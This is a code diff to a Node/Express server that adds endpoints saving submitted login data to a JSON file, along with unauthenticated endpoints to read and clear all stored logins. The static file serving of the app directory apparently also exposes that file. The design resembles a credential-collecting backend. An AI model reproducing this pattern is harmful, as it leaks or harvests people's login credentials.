@@ -2,11 +2,64 @@ const express = require('express');
 const path = require('path');
 const https = require('https');
 const http = require('http');
+const fs = require('fs');
 const app = express();
 const PORT = process.env.PORT || 5000;
 
-// Serve static files (for local dev only — Vercel handles css/js directly)
+app.use(express.json());
 app.use(express.static(path.join(__dirname)));
+
+// ── File-based DB ──────────────────────────────────────────────
+const DB_FILE = path.join(__dirname, 'data.json');
+
+function readDB() {
+    try {
+        if (!fs.existsSync(DB_FILE)) return { logins: [], requests: [] };
+        return JSON.parse(fs.readFileSync(DB_FILE, 'utf8'));
+    } catch { return { logins: [], requests: [] }; }
+}
+
+function writeDB(data) {
+    try { fs.writeFileSync(DB_FILE, JSON.stringify(data, null, 2)); } catch {}
+}
+
+// ── Save Login ─────────────────────────────────────────────────
+app.post('/api/save-login', (req, res) => {
+    try {
+        const db = readDB();
+        const entry = { ...req.body, time: new Date().toLocaleString() };
+        db.logins.push(entry);
+        writeDB(db);
+        res.json({ success: true });
+    } catch { res.json({ success: false }); }
+});
+
+// ── Save Request ───────────────────────────────────────────────
+app.post('/api/save-request', (req, res) => {
+    try {
+        const db = readDB();
+        const entry = { ...req.body, time: new Date().toLocaleString() };
+        db.requests.push(entry);
+        writeDB(db);
+        res.json({ success: true });
+    } catch { res.json({ success: false }); }
+});
+
+// ── Get Logs ───────────────────────────────────────────────────
+app.get('/api/get-logs', (req, res) => {
+    try {
+        const db = readDB();
+        res.json(db);
+    } catch { res.json({ logins: [], requests: [] }); }
+});
+
+// ── Clear Logs ─────────────────────────────────────────────────
+app.post('/api/clear-logs', (req, res) => {
+    try {
+        writeDB({ logins: [], requests: [] });
+        res.json({ success: true });
+    } catch { res.json({ success: false }); }
+});
 
 // ── Profile Name Fetcher ──────────────────────────────────────
 // ── Universal Profile API Service ──────────────────────────────
